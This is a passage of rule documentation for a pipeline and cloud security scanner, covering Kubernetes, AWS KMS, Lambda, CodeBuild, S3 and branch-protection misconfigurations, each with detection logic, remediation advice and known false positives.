**How this is detected.** Fires on a non-system workload whose ``spec.nodeSelector`` contains a control-plane role label, OR whose ``spec.tolerations`` carries an entry with a control-plane taint key. Either condition is sufficient to land the pod on the control plane (the toleration is what survives the node taint; the nodeSelector picks the node).

**Recommendation.** Drop the ``nodeSelector`` and ``tolerations`` entries that target ``node-role.kubernetes.io/control-plane`` (or the legacy ``master`` spelling) from non-system workloads. A pod scheduled on a control-plane node shares the kernel with the API server, etcd, and kubelet credentials, credential theft from any such pod yields cluster-wide takeover. Application workloads belong on dedicated worker nodes; system add-ons that legitimately need control-plane scheduling should run as a DaemonSet in ``kube-system``.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Audit/log shippers and CNI agents in kube-system are exempt by namespace. A workload that legitimately needs to run on the control plane outside kube-system is rare enough to warrant an explicit ``.pipelinecheckignore`` rationale.

**Source:** [`K8S-030`](../providers/kubernetes.md#k8s-030) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-031`: Namespace missing PSA warn label <span class="pg-sev pg-sev--low">LOW</span> { #detail-k8s-031 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Pod Security Admission supports three modes: ``enforce`` (reject), ``audit`` (log to API audit), and ``warn`` (return a kubectl warning). K8S-023 covers ``enforce``; this rule covers ``warn``. The convention from upstream PSA docs is to set ``warn`` to the next-strictest tier above your current ``enforce`` so an upgrade from baseline to restricted is a predictable rollout, not a surprise.

**Recommendation.** Set ``metadata.labels.pod-security.kubernetes.io/warn`` on every Namespace, ideally one tier ahead of the enforce label (e.g. ``enforce: baseline`` + ``warn: restricted``). The warn level surfaces violations as ``kubectl apply`` warnings without rejecting the resource, developers see what would break before an enforcement upgrade lands.

**Known false positives.**

- Single-tenant clusters may set ``warn`` and ``audit`` globally via the AdmissionConfiguration ``defaults:`` block instead of per-namespace labels. The label-based check can't see that.

**Source:** [`K8S-031`](../providers/kubernetes.md#k8s-031) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-032`: Namespace lacks default-deny NetworkPolicy <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-032 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** Kubernetes' default network model is allow-everything: without any NetworkPolicy targeting a namespace, every pod can talk to every other pod across every namespace, and every pod can reach the internet. A default-deny policy flips the default to deny, so the only flows that work are those an explicit allow policy permits. The check fires on namespaces declared in the manifest set that have at least one workload but no default-deny NetworkPolicy covering them. Cross-doc correlation: it walks the full manifest stream to match Namespace/workload/NetworkPolicy across files.

**Recommendation.** Apply a default-deny NetworkPolicy in every namespace that carries workloads. The canonical shape is ``podSelector: {}`` (matches every pod) plus ``policyTypes: [Ingress, Egress]`` with no ``ingress:`` / ``egress:`` rules, every flow is denied unless a more permissive NetworkPolicy in the same namespace explicitly allows it. Pair with per-workload allow-list policies for the flows the application actually needs.

**Known false positives.**

- Mesh-managed clusters (Istio, Linkerd, Cilium ClusterMesh) often delegate L4 default-deny to the mesh's authorization policy. The check only looks at native NetworkPolicy and won't see that.
- kube-system / kube-public / kube-node-lease are exempt, control-plane components frequently need open networking and have their own admission-time guards.

**Source:** [`K8S-032`](../providers/kubernetes.md#k8s-032) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-033`: Namespace lacks ResourceQuota or LimitRange <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-033 }

**Evidences:** [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations.

**How this is detected.** Without a ResourceQuota, a single namespace can consume the cluster's entire scheduling capacity, a fork bomb in a CronJob, a memory leak in a Deployment, or a cryptominer that landed via a fork-PR build can starve every other tenant. Without a LimitRange, individual pods without explicit ``resources:`` requests get a default of zero, the scheduler treats them as best-effort and packs them on any node, including ones already at memory pressure. The two work together: quota caps the aggregate, range caps the per-workload baseline. Cross-doc correlation: walks the manifest stream to match Namespace / workload / ResourceQuota / LimitRange across files.

**Recommendation.** Apply a ``ResourceQuota`` *and* a ``LimitRange`` to every namespace that hosts application workloads. ResourceQuota caps the namespace's total CPU / memory / pod / object consumption; LimitRange enforces per-pod request / limit defaults so a workload that forgets to declare its own doesn't get unbounded scheduling. Together they bound the blast radius of a runaway, leaky, or attacker-driven pod explosion to a single namespace.

**Source:** [`K8S-033`](../providers/kubernetes.md#k8s-033) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-034`: ServiceAccount automountServiceAccountToken not explicitly false <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-034 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** K8S-012 covers the pod-level ``automountServiceAccountToken`` setting; this rule covers the same control at the ServiceAccount level. The two are complementary: the SA-level default flips the cluster-wide baseline (``true`` -> ``false``), the pod-level override re-enables only where needed. Without the SA-level disable, every pod that doesn't set its own override mounts a token that can call the K8s API as that SA, a useful credential for an attacker who lands code in any pod, regardless of the workload's own intent.

**Recommendation.** Set ``automountServiceAccountToken: false`` at the ServiceAccount level for every SA that doesn't actively need to call the Kubernetes API. The pods that legitimately do (operators, sidecars that read namespaces, controllers) can opt back in per-pod via ``spec.automountServiceAccountToken: true``. The default is mount-everywhere, which is the wrong direction for least privilege.

**Known false positives.**

- Operator / controller workloads (cert-manager, metrics-server, ingress controllers) legitimately need API access from every pod. Their dedicated SAs should keep automount enabled, leave them out of the cluster-wide disable. ``default`` SA in every namespace is the high-fire case worth disabling.

**Source:** [`K8S-034`](../providers/kubernetes.md#k8s-034) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-035`: Container securityContext.runAsUser is 0 <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-035 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** K8S-007 covers ``runAsNonRoot: false`` (the boolean form). This rule covers the explicit numeric form: a container that sets ``runAsUser: 0`` runs as root regardless of ``runAsNonRoot`` being declared elsewhere. Kubernetes won't reject the spec, it just runs the container as root. The two rules are paired so neither shape slips through alone. The pod-level ``securityContext.runAsUser`` inherits to every container that doesn't override it; this rule fires on the *effective* UID, walking pod-level first then per-container override.

**Recommendation.** Set ``securityContext.runAsUser`` to a non-zero UID (e.g. 1000 or any application-specific value) on every workload container. The corresponding ``runAsGroup`` and ``fsGroup`` should also be non-zero. Root inside a container is not isolation, a kernel CVE, a misconfigured mount, or a mis-applied capability collapses straight into the host.

**Source:** [`K8S-035`](../providers/kubernetes.md#k8s-035) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-036`: ServiceAccount imagePullSecrets references missing Secret <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-036 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Cross-doc correlation: walks every ServiceAccount's ``imagePullSecrets`` and confirms the named Secret exists in the same namespace within the manifest set. Misses two cases: secrets created out-of-band (Sealed Secrets, External Secrets, or operator-applied ones) and SAs whose namespace is implicit / not declared in the manifest set. For those, the rule passes, false-negative-friendly.

**Recommendation.** Create the missing ``Kind: Secret`` of ``type: kubernetes.io/dockerconfigjson`` (or ``dockercfg``) in the same namespace before applying the ServiceAccount, or fix the ``imagePullSecrets`` reference name. A dangling reference doesn't fail apply, kubelet silently falls back to anonymous registry pulls on every image fetch. Workloads either pull a different image than the operator intended or fail at runtime with ``ImagePullBackOff`` after the registry rate-limits the unauthenticated client.

**Known false positives.**

- Manifests rendered for partial deployment where the secret lives in a parallel manifest set the scanner doesn't see (separate ArgoCD application, Vault-injected, ESO-synced). Add ``# pipeline-check: ignore K8S-036`` or ignore the specific SA name to silence.

**Source:** [`K8S-036`](../providers/kubernetes.md#k8s-036) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-037`: ConfigMap data carries a credential-shaped literal <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-037 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed, [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Companion to K8S-018 (which scans Kind: Secret). Walks ConfigMap ``data`` and ``binaryData`` for AKIA-shaped AWS keys and credential-shaped key NAMES. Even when the value is a placeholder, having ``api_key: REPLACE_ME`` in a ConfigMap is a maintenance footgun, someone will fill it in and commit. RBAC scoping for ``configmaps`` is typically much broader than ``secrets``, so any credential leak via this path reaches a wider audience.

**Recommendation.** Move the value out of the ConfigMap. Secrets belong in ``Kind: Secret`` (better: SealedSecrets, ExternalSecrets / ESO, SOPS-encrypted manifests, or HashiCorp Vault Agent injection). ConfigMaps are intended for non-sensitive config and are mounted into pods without the access controls Secrets carry, the ``RoleBinding`` for ``configmaps:get`` is typically far broader than the one for ``secrets:get``. A credential in a ConfigMap is effectively unprotected once any pod can read the namespace's config.

**Known false positives.**

- ConfigMaps that legitimately carry placeholder names (``DEBUG_TOKEN_FORMAT``, ``LICENSE_KEY_HEADER``) where the VALUE is a format hint rather than a credential. Rename the key to avoid the credential-shaped name.

**Source:** [`K8S-037`](../providers/kubernetes.md#k8s-037) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-038`: NetworkPolicy ingress / egress allows all sources or destinations <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-038 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** K8S-032 covers the absence of a default-deny NetworkPolicy. This rule covers the inverse: a NetworkPolicy that exists but contains an ``ingress:`` rule with no ``from:`` (allow from all) or no ``ports:`` filter, or an ``egress:`` rule with no ``to:`` filter. The ``from: []`` / ``to: []`` shorthand is the canonical mistake. A rule that lists specific peers via ``podSelector`` / ``namespaceSelector`` / ``ipBlock`` passes.

**Recommendation.** Replace the empty ``from: []`` / ``to: []`` rule with an explicit ``from: [{podSelector: {matchLabels: {…}}}]`` or ``from: [{namespaceSelector: {matchLabels: {…}}}]`` that names the legitimate peer. An empty ``from`` / ``to`` peers list means *every* source / destination, every pod in every namespace, plus every external IP. This is indistinguishable from having no NetworkPolicy at all for the targeted pod, but visually appears to enforce a policy (the false-sense-of-security failure mode is worse than no policy).

**Known false positives.**

- Policies intentionally allowing world traffic to a public ingress controller pod ({app: nginx-ingress, public: true}). Add ``# pipeline-check: ignore K8S-038`` on the specific NetworkPolicy if the wide-open shape is deliberate.

**Source:** [`K8S-038`](../providers/kubernetes.md#k8s-038) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-039`: Pod uses shareProcessNamespace: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-039 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** ``shareProcessNamespace: true`` makes every container in the pod share a single PID namespace. Any container can then enumerate every other container's processes (``ps``), read their environment variables and CLI args from ``/proc/<pid>/``, send them signals, and (with the right capabilities) ``ptrace`` them. A compromised sidecar, debug shell, logging agent, observability exporter, gets a free pivot into every primary container's secrets. The default is ``false``; setting it explicitly to ``true`` is the failing shape.

**Recommendation.** Drop ``spec.shareProcessNamespace: true`` from the pod spec. Containers in the pod will go back to having isolated PID namespaces, each sees only its own processes, can't ``ptrace`` neighbors, and can't read their ``/proc/<pid>/environ`` for env-var-leaked secrets. If the requirement is sidecar-style log collection or process-level cooperation, prefer a sidecar pattern that exchanges data through a shared volume rather than collapsing the namespace.

**Known false positives.**

- Debug pods that explicitly need ``ps`` / ``strace`` across container boundaries, but those are typically ephemeralContainers attached to a running pod, not long-lived pod specs in a manifest. If a permanent workload genuinely requires it, ignore the rule with a documented justification.

**Source:** [`K8S-039`](../providers/kubernetes.md#k8s-039) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-040`: Container securityContext.procMount: Unmasked <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-040 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** ``procMount: Unmasked`` is rarely needed in practice. It exists for nested-container / KubeVirt scenarios where the container itself runs an inner container runtime that needs to set up its own ``/proc`` masking. For an ordinary application container, ``Unmasked`` is a runtime-isolation regression that exposes kernel-information paths and writable ``/proc/sys`` entries to the workload. Pod Security Standards classify ``Unmasked`` as 'restricted'-violating; the rule fires when any container (``containers``, ``initContainers``, ``ephemeralContainers``) explicitly sets ``procMount: Unmasked``.

**Recommendation.** Remove ``securityContext.procMount: Unmasked`` (or set it explicitly to ``Default``). The default ``Default`` procMount type masks several kernel- and node-information paths under ``/proc`` (``/proc/asound``, ``/proc/acpi``, ``/proc/kcore``, ``/proc/keys``, ``/proc/latency_stats``, ``/proc/timer_list``, ``/proc/timer_stats``, ``/proc/sched_debug``, ``/proc/scsi``) and remounts ``/proc/sys`` as read-only. These maskings are what stop a container from reading the host's kernel structures or writing to ``/proc/sys`` and breaking the kernel out of namespace isolation. ``Unmasked`` undoes all of that.

**Source:** [`K8S-040`](../providers/kubernetes.md#k8s-040) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-041`: Service.externalIPs allows traffic interception (CVE-2020-8554) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-k8s-041 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** CVE-2020-8554 is a design-level Kubernetes weakness rather than a code bug: any namespace user with ``services`` create permission can declare ``spec.externalIPs: [<arbitrary IP>]`` on a Service, and kube-proxy installs DNAT rules that intercept traffic destined for that IP on every node. The attacker primitive is to MITM in-cluster traffic to public endpoints, metadata services, or other tenants' workloads. Kubernetes upstream's remediation is admission-time enforcement (see the ``DenyServiceExternalIPs`` admission plugin and the RBAC pattern in the official guidance) rather than a runtime fix. This rule flags any non-empty ``externalIPs`` list so the team can confirm the field is gone from manifests before the admission policy is rolled out.

**Recommendation.** Remove ``spec.externalIPs`` from the Service. The field has no legitimate use in most clusters and any namespace user with ``services.create`` can claim any IP, including the cluster's own kube-apiserver, metrics-server, or an external service IP, and the kube-proxy iptables rules will redirect matching traffic to their pods. Enforce the absence cluster-wide with an admission policy (Gatekeeper / Kyverno / ValidatingAdmissionPolicy) that rejects Services with a non-empty ``externalIPs`` list.

**Seen in the wild.**

- CVE-2020-8554 (Kubernetes, 2020): documented MITM-via-externalIPs design flaw. Kubernetes' upstream advisory recommends restricting externalIPs via admission control.

**Source:** [`K8S-041`](../providers/kubernetes.md#k8s-041) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-042`: RoleBinding grants access to system:anonymous / system:unauthenticated <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-k8s-042 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** Kubernetes resolves authentication failures into the ``system:anonymous`` user (member of ``system:unauthenticated`` group) rather than rejecting the request outright, so any RBAC subject naming either of those values applies to requests with no Authorization header. The rule fires on both ``RoleBinding`` (namespace-scoped) and ``ClusterRoleBinding`` (cluster-scoped) subjects. Pairs with K8S-020: cluster-admin bound to a named SA is bad; cluster-admin bound to ``system:anonymous`` is cluster takeover by anyone with TCP/443 to the apiserver.

**Recommendation.** Remove the binding's subject entry for ``system:anonymous`` or ``system:unauthenticated``. Anything bound to either subject is reachable without an authentication token, anyone who can hit the apiserver, including from inside an untrusted pod or from the public internet on an exposed apiserver, gets the bound verbs. If the workload genuinely needs unauthenticated read access (rare, usually only for OIDC discovery or the deprecated ``system:public-info-viewer`` shape), audit the bound ClusterRole's verbs+resources and confirm no write or secret-read verb is included.

**Source:** [`K8S-042`](../providers/kubernetes.md#k8s-042) in the [Kubernetes provider](../providers/kubernetes.md).

#### `K8S-043`: Ingress rule has wildcard or missing host (catch-all) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-k8s-043 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** An Ingress rule with no ``host:`` matches every Host header the controller receives; a rule with ``host: '*'`` is the explicit form of the same behavior. Both shape choices collapse the controller's hostname-based routing into a pure path-based match, which means anyone who can present any hostname (HTTP/1.1 Host header rewrite, malicious CNAME, controller hairpin) reaches this backend. The rule also fires on apex wildcards like ``host: '*.example.com'`` since they accept subdomains the cluster operator never intended to register. A backend that's intentionally wildcard-routed (a tenant-per-subdomain SaaS) should suppress with a rationale rather than disabling the check.

**Recommendation.** Pin every Ingress rule to an explicit hostname. ``host: api.example.com`` (not ``host: '*'``, ``host: '*.example.com'``, and not an omitted ``host:``). A catch-all host binding means any request to the ingress controller's external address, regardless of HTTP Host header, can route to this backend; an attacker with control over an arbitrary hostname pointing at the same controller (a parked domain, a typo'd CNAME, a cluster-internal name on a shared controller) reaches paths that should have been host-scoped.

**Known false positives.**

- TLS terminators that intentionally use a single Ingress with a wildcard host to front many tenant subdomains are legitimate; suppress the finding for that Ingress specifically rather than disabling the rule.

**Source:** [`K8S-043`](../providers/kubernetes.md#k8s-043) in the [Kubernetes provider](../providers/kubernetes.md).

#### `KMS-001`: KMS customer-managed key has rotation disabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-kms-001 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Annual rotation regenerates the underlying key material for the same CMK ARN. Existing ciphertexts can still be decrypted (KMS keeps old material around), but new encrypts use the new material, so a cryptographic exposure (side-channel, an accidental export, an old compromised offline backup) only protects ciphertexts from before the rotation.

**Recommendation.** Enable annual rotation on every customer-managed KMS key used for CI/CD artifact, log, and secret encryption. Unrotated CMKs keep the same key material indefinitely, so a single cryptographic exposure (side-channel, accidental export) is permanent.

**Source:** [`KMS-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `KMS-002`: KMS key policy grants wildcard KMS actions <span class="pg-sev pg-sev--high">HIGH</span> { #detail-kms-002 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed.

**How this is detected.** ``kms:*`` on a key policy is administrative authority over the cipher boundary: ``CancelKeyDeletion``, ``ScheduleKeyDeletion``, ``ReEncrypt``, ``UpdateKeyDescription``, and the data-plane decrypt actions all collapse into one grant. A CI/CD principal almost never needs more than the data-plane subset (``Decrypt`` / ``GenerateDataKey`` / ``Encrypt``).

**Recommendation.** Replace ``kms:*`` grants with specific actions needed by the caller (e.g. ``kms:Decrypt``, ``kms:GenerateDataKey``). Key-policy wildcard grants let any holder of the principal re-key, schedule deletion, or export material at will.

**Source:** [`KMS-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-001`: Lambda function has no code-signing config <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-001 }

**Evidences:** [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Lambda code-signing config + a Signer profile (SIGN-001) validates that an uploaded zip was signed by a known profile before it's allowed to run. Without one, anyone who reaches ``lambda:UpdateFunctionCode``, a CI/CD role compromise, a misattached IAM policy, can replace the function's code with no chain-of-custody check.

**Recommendation.** Create an AWS Signer profile, reference it from an ``aws_lambda_code_signing_config`` with ``untrusted_artifact_on_deployment = Enforce`` and attach that config to the function. Without one, the Lambda runtime will execute any code that a principal with lambda:UpdateFunctionCode uploads.

**Source:** [`LMB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-002`: Lambda function URL has AuthType=NONE <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-002 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** A Lambda function URL with ``AuthType=NONE`` is a public HTTPS endpoint. Anyone who knows the URL can invoke. This is sometimes deliberate (a webhook receiver) but the deliberate version typically signs / validates inside the function, the rule fires regardless because the IAM-side control isn't there.

**Recommendation.** Set the function URL ``auth_type`` to ``AWS_IAM`` and grant ``lambda:InvokeFunctionUrl`` through IAM. ``NONE`` exposes the function to the public internet without authentication.

**Source:** [`LMB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-003`: Lambda function env vars may contain plaintext secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-lmb-003 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Lambda env vars are world-readable to any principal with ``lambda:GetFunctionConfiguration``, much wider than the principal that can invoke the function. They also persist in CloudFormation drift, change-sets, and CloudTrail events. A secret in a Lambda env var is essentially exposed to anyone with read access to the account.

**Recommendation.** Move secrets out of Lambda environment variables and into Secrets Manager or SSM Parameter Store. Environment variables are visible to anyone with ``lambda:GetFunctionConfiguration`` and persist in CloudTrail events, which keeps the secret in audit logs.

**Source:** [`LMB-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `LMB-004`: Lambda resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-lmb-004 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** A wildcard-principal Allow on a Lambda function resource policy lets anyone invoke. The legitimate case is a service principal (API Gateway, S3 events) where AWS fills in the SourceArn/SourceAccount at invoke time, without those conditions, any account using that service can invoke.

**Recommendation.** Remove Allow statements with ``Principal: '*'`` from every Lambda function resource policy, or scope them with a ``SourceArn`` / ``SourceAccount`` condition. Service principals (e.g. ``apigateway.amazonaws.com``) are the common legitimate case, ensure they carry a condition.

**Source:** [`LMB-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-001`: CodeBuild project has no VPC configuration <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-001 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** A CodeBuild project with no VPC configuration runs in AWS-managed network space, egress to the public internet is unrestricted, every package registry / CDN / arbitrary endpoint is reachable. Inside a VPC, security-group + VPC-endpoint policies become the egress gate, which is the only practical way to limit a compromised build's exfiltration paths.

**Recommendation.** Configure the CodeBuild project to run inside a VPC with appropriate subnets and security groups. Use a NAT gateway or VPC endpoints to control outbound internet access and restrict build nodes to only the network resources they require.

**Source:** [`PBAC-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-002`: CodeBuild service role shared across multiple projects <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-002 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** One CodeBuild service role across many projects means a compromise of any project's build environment grants access to whatever resources every other project's build needs. Per-project roles cap the radius, a backdoor in the ``foo-tests`` build can't reach the ``deploy-prod`` build's secrets if they each have their own role.

**Recommendation.** Create a dedicated IAM service role for each CodeBuild project, scoped to only the permissions that specific project requires. This limits the blast radius if one project's build is compromised.

**Source:** [`PBAC-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-003`: CodeBuild security group allows 0.0.0.0/0 all-port egress <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-pbac-003 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** A security-group egress rule of ``0.0.0.0/0`` on all ports/protocols means a compromised build can connect to any endpoint on the internet, typosquat-package registry, C2 server, attacker-owned dump endpoint. Even when the build is inside a VPC (PBAC-001), this egress rule negates the network-side gating.

**Recommendation.** Restrict CodeBuild security-group egress to the specific endpoints builds need (package registries, artifact repositories, STS). A wildcard egress rule lets a compromised build exfiltrate to anywhere on the internet.

**Source:** [`PBAC-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `PBAC-005`: CodePipeline stage action roles mirror the pipeline role <span class="pg-sev pg-sev--high">HIGH</span> { #detail-pbac-005 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** When stage actions don't set their own ``roleArn``, they fall back to the pipeline-level role, which is the union of every stage's needs. A compromise of any one stage (typically the build, which runs untrusted code) gains the deploy stage's authority, including production deploy credentials. Per-action roles cap the radius.

**Recommendation.** Give each stage action (Source, Build, Deploy) its own narrowly-scoped IAM role via ``roleArn`` on the action declaration. Sharing the pipeline-level role means a compromise of one action (e.g. a build) gains the permissions the deploy stage also needs.

**Source:** [`PBAC-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-001`: Artifact bucket public access block not fully enabled <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-s3-001 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** S3 Block Public Access is the bucket-level circuit breaker that supersedes any future ACL or bucket-policy edit. Without all four settings enabled, a misconfigured CloudFormation change or a stray ``aws s3api`` call can re-expose the bucket to the public, even if the bucket had previously been private.

**Recommendation.** Enable all four S3 Block Public Access settings on the artifact bucket: BlockPublicAcls, IgnorePublicAcls, BlockPublicPolicy, and RestrictPublicBuckets.

**Source:** [`S3-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-002`: Artifact bucket server-side encryption not configured <span class="pg-sev pg-sev--high">HIGH</span> { #detail-s3-002 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Default bucket encryption applies SSE-S3 (AES256) to every PutObject. As of January 2023, AWS enables this on all new buckets automatically, but existing buckets created before then can still be unencrypted unless explicitly configured. Without it, individual objects can be uploaded without encryption (the client gets to choose).

**Recommendation.** Enable default bucket encryption using at minimum AES256 (SSE-S3). For stronger key control, use SSE-KMS with a customer-managed key.

**Source:** [`S3-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-003`: Artifact bucket versioning not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-003 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected, [`PR.IR-03`](#ctrl-pr-ir-03) Mechanisms are implemented to achieve resilience requirements in normal and adverse situations, [`RC.RP-01`](#ctrl-rc-rp-01) The recovery portion of the incident response plan is executed once initiated.

**How this is detected.** Versioning makes overwrites and deletes recoverable: the previous content of an object survives until lifecycle expires it. Without versioning, an artifact overwrite (a bad pipeline run, a malicious replacement, a typo'd ``aws s3 cp``) is unrecoverable, the original bytes are gone.

**Recommendation.** Enable S3 versioning on the artifact bucket so that previous artifact versions are retained and rollback is possible. Combine with a lifecycle rule to expire old versions after a retention period.

**Source:** [`S3-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-004`: Artifact bucket access logging not enabled <span class="pg-sev pg-sev--low">LOW</span> { #detail-s3-004 }

**Evidences:** [`PR.PS-04`](#ctrl-pr-ps-04) Log records are generated and made available for continuous monitoring, [`DE.CM-01`](#ctrl-de-cm-01) Networks and network services are monitored to find potentially adverse events, [`DE.AE-03`](#ctrl-de-ae-03) Information is correlated from multiple sources.

**How this is detected.** S3 server access logging records every API operation against the bucket, who, when, what object, what method. CloudTrail data events overlap but cost more; access logs are the cheap baseline. Without them, an exfiltration via ``GetObject`` doesn't leave a trail you can investigate.

**Recommendation.** Enable S3 server access logging for the artifact bucket and direct logs to a separate, centralized logging bucket with restricted write access.

**Source:** [`S3-004`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `S3-005`: Artifact bucket missing aws:SecureTransport deny <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-s3-005 }

**Evidences:** [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** S3 endpoints accept HTTP and HTTPS by default. Without an explicit Deny on ``aws:SecureTransport=false``, a plaintext request, typically from a misconfigured client or a SDK with a stale endpoint, is honored if signed. The bucket policy Deny is the only enforcement; no account-level switch covers it.

**Recommendation.** Add a Deny statement for s3:* with Bool aws:SecureTransport=false.

**Source:** [`S3-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `SCM-001`: Default branch has no protection rule <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-001 }

**Evidences:** [`PR.AA-05`](#ctrl-pr-aa-05) Access permissions, entitlements, and authorizations are defined in a policy, managed, enforced, and reviewed, [`PR.PS-06`](#ctrl-pr-ps-06) Secure software development practices are integrated, and their performance is monitored throughout the SDLC.

**How this is detected.** Without a branch protection rule on the default branch, anyone with write access can force-push, delete the branch, or merge directly without review. Even when CI runs on the branch, an unprotected default branch lets a single compromised maintainer rewrite history and erase the audit trail. The check is sourced from the GitHub REST API (``GET /repos/{owner}/{repo}/branches/{branch}/protection``); a 404 response is itself the failure signal.

**Recommendation.** Add a branch protection rule on the default branch in the repository's Settings -> Branches. At minimum require pull request reviews before merging, require status checks to pass, and disable force-pushes / deletions. Match the rule to OpenSSF Scorecard's Branch-Protection thresholds for the organization's compliance baseline.

**Seen in the wild.**

